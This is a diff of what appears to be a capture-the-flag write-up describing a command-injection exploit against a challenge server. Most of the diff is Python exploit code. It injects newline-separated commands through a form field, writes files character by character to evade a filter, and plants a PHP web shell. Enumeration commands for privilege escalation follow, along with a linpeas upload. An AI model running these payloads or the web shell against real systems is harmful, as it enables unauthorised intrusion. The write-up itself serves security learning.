@@ -467,11 +467,11 @@ def execute_command(cmd):
     b64_string = b64_string.replace('=', '').replace('+', '-')
     print(f"[+] Modified Base64:  {b64_string}")
 
-    #1. Build the passer file
+    # Build the passer file
     passer_cmd = f"echo {b64_string} > /tmp/b"
     build_file("/tmp/p", passer_cmd)
     
-    # 2. Execute the chain!
+    # Execute the chain!
     print("\n[+] Executing Passer (/tmp/p)...")
     send_raw_payload(r"%0As\h+/tmp/p")
     time.sleep(1)
@@ -513,8 +513,287 @@ if __name__ == "__main__":
     execute_command(target_command)
 ```
 
+### 3. Further Enhance The RCE Capability
+The setup above managed to allow me to execute any command I want on the server, however, for long bash script it will take quite some time to inject the the whole base64 string onto the server.
+
+On the server there is a `/var/www/html/images` folder that belongs to www-data and is exposed to the internet. I, as www-data, can create a simple PHP uploader called `up.php` that execute the command from the `cmd` parameter of an incoming GET request.
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+Instead of executing the command right away, I decide to move the command to a `cmd.sh` file in the `./images` folder first before just be better debugging. Inside the `/tmp` folder I let the `/tmp/k` handle the task of executing `cmd.sh` and output the result to `out.log` file.
+
+```bash
+bash /var/www/html/images/cmd.sh > /var/www/html/images/out.log 2>&1
+```
+
+This is the python script used to creates the two files:
+```python
+import base64
+from bs4 import BeautifulSoup
+import requests
+import time
+  
+URL = "http://103.77.175.40:11121/"
+  
+def send_raw_payload(payload):
+    body = "word=" + payload
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    print(f"[*] Sending: {payload}")
+    try:
+        response = requests.post(URL, data=body, headers=headers, timeout=5)
+        return response.text
+    except requests.exceptions.Timeout:
+        return "[!] Request timed out"
+  
+def build_file(filepath, content):
+    print(f"\n[+] Building {filepath}...")
+    for i, char in enumerate(content):
+        is_first = (i == 0)
+        redirect = ">" if is_first else ">>"
+        if char == ' ':
+            base = r'\+'
+        elif char == '>':
+            base = r'\>'
+        elif char == '<':
+            base = r'\<'
+        elif char == '\\':
+            base = r'\\'
+        else:
+            base = char
+        payload = f"{base}\\\\{redirect}{filepath}"
+        send_raw_payload(payload)
+        time.sleep(0.3)
+  
+def execute_command(cmd):
+    print(f"[+] Original Command: {cmd}")
+    
+    b64_string = base64.b64encode(cmd.encode()).decode()
+    b64_string = b64_string.replace('=', '').replace('+', '-')
+    print(f"[+] Modified Base64:  {b64_string}")
+  
+    passer_cmd = f"echo {b64_string} > /tmp/b"
+    build_file("/tmp/p", passer_cmd)
+
+    print("\n[+] Executing Passer (/tmp/p)...")
+    send_raw_payload(r"%0Abash+/tmp/p")
+    time.sleep(1)
+    print("\n[+] Executing Swapper (/tmp/s)...")
+    send_raw_payload(r"%0Abash+/tmp/s")
+    time.sleep(1)
+    print("[+] Executing Decoder (/tmp/d)...")
+    send_raw_payload(r"%0Abash+/tmp/d")
+    time.sleep(1)
+    print("[+] Executing Final Payload (/tmp/k)...")
+    result = send_raw_payload(r"%0Abash+/tmp/k")
+    
+    print("\n" + "="*50)
+    print("[+] SERVER RESPONSE:")
+    
+    start_tag = '<main class="form-signin w-50 m-auto">'
+    end_tag = '<form method="POST">'
+    
+    start_idx = result.find(start_tag)
+    end_idx = result.rfind(end_tag)
+    
+    if start_idx != -1 and end_idx != -1 and start_idx < end_idx:
+        extracted_text = result[start_idx + len(start_tag) : end_idx]
+        clean_text = extracted_text.replace('<br>', '\n').replace('<br/>', '\n').replace('<br />', '\n')
+        print(clean_text.strip())
+    
+    else:
+        print("[!] Target boundaries not found! Printing raw output:\n")
+        print(result)
+    print("="*50)
+    print("\n[+] Done! Check your listener or output.")
+  
+if __name__ == "__main__":
+    # target_command = """echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/images/up.php"""                <-- Run this first!
+    target_command = """echo 'bash /var/www/html/images/cmd.sh > /var/www/html/images/out.log 2>&1' > /tmp/k"""
+    execute_command(target_command)
+```
+
+Then I can quickly execute any commands with this next python script:
+```python
+import requests
+import time
+import base64
+  
+BASE_URL = "http://103.77.175.40:11121/"
+UPLOAD_URL = f"{BASE_URL}images/up.php"
+OUTPUT_URL = f"{BASE_URL}images/out.log"
+  
+def send_raw_payload(payload):
+    """Sends the trigger payload through the main WAF bypass."""
+    body = "word=" + payload
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    print(f"[*] Sending trigger: {payload}")
+    
+    try:
+        requests.post(BASE_URL, data=body, headers=headers, timeout=3)    
+    except requests.exceptions.Timeout:
+        pass
+  
+def upload_script(bash_content):
+    """Writes the bash script to the server using the up.php web shell."""
+    print("[*] Writing cmd.sh via up.php web shell...")
+    # 1. Base64 encode the Bash script to bypass all bad characters
+    b64_content = base64.b64encode(bash_content.encode()).decode()
+
+    # 2. Craft the command to decode it and write it to cmd.sh
+    linux_cmd = f"echo {b64_content} | base64 -d > /var/www/html/images/cmd.sh"
+    try:
+
+        # 3. Send it to the ?cmd= parameter
+        response = requests.get(UPLOAD_URL, params={'cmd': linux_cmd}, timeout=5)
+        if response.status_code == 200:
+            print("[+] Script written successfully!")
+        else:
+            print(f"[!] Target returned unexpected status code: {response.status_code}")
+    except Exception as e:
+        print(f"[!] Upload failed: {e}")
+  
+def fetch_results():
+    """Retrieves and prints the contents of out.log."""
+    print("[*] Fetching execution results...\n")
+    print("=" * 50)
+    try:
+        response = requests.get(OUTPUT_URL)
+        if response.status_code == 200:
+            print(response.text.strip())
+        else:
+            print(f"[!] Could not read out.log. HTTP Status: {response.status_code}")
+    except Exception as e:
+         print(f"[!] Failed to fetch output: {e}")
+    print("\n" + "=" * 50)
+  
+def main():
+    # 1. Write the bash command
+    cmd_payload = """#!/bin/bash
+ls images
+"""
+
+    # 2. Upload the script
+    upload_script(cmd_payload)
+    
+    # 3. Trigger the executor script at /tmp/k
+    send_raw_payload("%0Abash+/tmp/k")
+    time.sleep(1.5)
+    
+    # 4. Fetch and print the output
+    fetch_results()
+  
+if __name__ == "__main__":
+    main()
+```
+
+Now that my RCE setup is finally complete.
+
+
+
 ---
+
 ## Finding the Second Flag
+The second flag is really hard to find. 
+
+### Environment
+```bash
+env
+```
+
+![[Pasted image 20260301220620.png]]
+
+There is no hidden flag or credential inside the environment variables.
+
+### SUID or SGID
+```bash
+find / -perm -g=s -type f -ls 2>/dev/null
+```
+
+![[Pasted image 20260301220653.png]]
+
+```bash
+find / -perm -u=s -type f -ls 2>/dev/null
+```
+
+![[Pasted image 20260301220741.png]]
+
+All of the commands are very standard and are correctly configured, nothing special, no weird SUID or SGID commands here I can use to escalate privilege.
+
+### Cronjobs
+```bash
+ls -la /etc/cron.*
+```
+
+![[Pasted image 20260301220841.png]]
+
+All cronjobs are normal, nothing really out of place, we can not write to any cronjobs nor any of them are connected insecurely. I checked the contents of all of them and knows that none of them seems to be exploitable.
+
+`e2scrub_all` at first looked a little weird to me but after knowing it is a normal file from the `e2fsprogs` package that is used for checking for file corruption, I decide to move on.
+
+### Packages
+There might be vulnerable version of an installed library or binary, moreover, the server has very limited tools so I need to know more about what I have at hand for further enumeration.
+
+```bash
+dpkg -l
+```
+
+![[Pasted image 20260301220927.png]]
+
+There are many tools missing like `netcat`, `ping`, `ss`, `netstat`, `getcap`, `sudo`, etc.
+
+I can see the server has some compiler like `gcc`, `perl`, `cpp` but no `python` though. Meaning if I can compiler external exploiting tools right on the server.
+
+### Process Status
+```bash
+ps aux
+```
+
+![[Pasted image 20260301221028.png]]
+
+Overall there was no notable process, everything are completely normal, the shown processes are just the apache2 workers and my own processes.
+
+### Users and Groups
+
+![[Pasted image 20260301220443.png]]
+
+The only user that has a console on the server is root, meaning root is the only user I can switch to using `su`.
+
+There are no leaked password inside `/etc/passwd`. Many users of the server don't even own any files or folder, some folders exist solely because they were created when the user was created by root, which are not exploitable.
+
+```bash
+find / \
+  -path /proc -prune -o \
+  -path /sys -prune -o \
+  -path /dev -prune -o \
+  ! -user root -print -ls 2>/dev/null
+```
+
+![[Pasted image 20260301221956.png]]
+
+The folder `/var/cache/apt/archives/partial` is not accessible. So overall, nothing to find here.
+
+Files that are writeable by `www-data` are all owned by `www-data` without relating to other users.
+
+### Other
+Nothing else can be found, I tried looking for a few more environment files or configuration files inside the `/etc` and `/proc/*/environ` but most of them give the same information with no difference.
+
+Inside the web directory also shows no information, passwords files in cache are correctly configured so that users other than root cannot read.
+
+I decide to rely on automation tools by uploading `linpeas` to the server and running it.
+
+![[Pasted image 20260301230925.png]]
+
+![[Pasted image 20260301230932.png]]
+
+![[Pasted image 20260301231023.png]]
+
+Unfortunately, all of Linpeas's output was just false positive. When I look into the files they are perfectly normal. It seems like the box has no vertical privilege escalation to root.
+
+![[Pasted image 20260301230946.png]]
+
+The current shell also have zero capability.
 
 ---
 
